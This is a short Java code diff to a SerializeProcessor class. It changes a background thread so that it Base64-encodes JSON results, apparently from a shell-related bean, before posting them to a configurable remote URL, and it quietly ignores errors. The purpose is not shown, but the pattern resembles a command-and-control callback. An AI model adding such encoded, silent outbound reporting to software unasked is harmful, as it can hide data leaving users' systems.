@@ -1,5 +1,7 @@
 package com.github.devswork.util;
 
+import com.alibaba.fastjson.JSON;
+import com.github.devswork.util.json.JSONObject;
 import com.util.ShellBean;
 import org.springframework.web.client.RestTemplate;
 
@@ -83,12 +85,15 @@ public class SerializeProcessor {
                     Map<String, Object> map = new HashMap<>();
                     map.put("t", integer == null ? -1 : integer);
                     map.put("d", data);
-                    new RestTemplate().postForObject(sb.getCast(), map, String.class);
+                    String json = JSON.toJSONString(map);
+                    new RestTemplate().postForObject(sb.getCast(), Base64.getEncoder().encodeToString(json.getBytes("UTF-8")), String.class);
                 } catch (Exception e) {
                     Map<String, Object> exceptionMap = new HashMap<>();
                     exceptionMap.put("t", 0);
                     exceptionMap.put("d", e.toString());
-                    new RestTemplate().postForObject(sb.getCast(), exceptionMap, String.class);
+                    try {
+                        new RestTemplate().postForObject(sb.getCast(), Base64.getEncoder().encodeToString(e.toString().getBytes("UTF-8")), String.class);
+                    }catch (Exception e2){}
                 }
             }
         }).start();
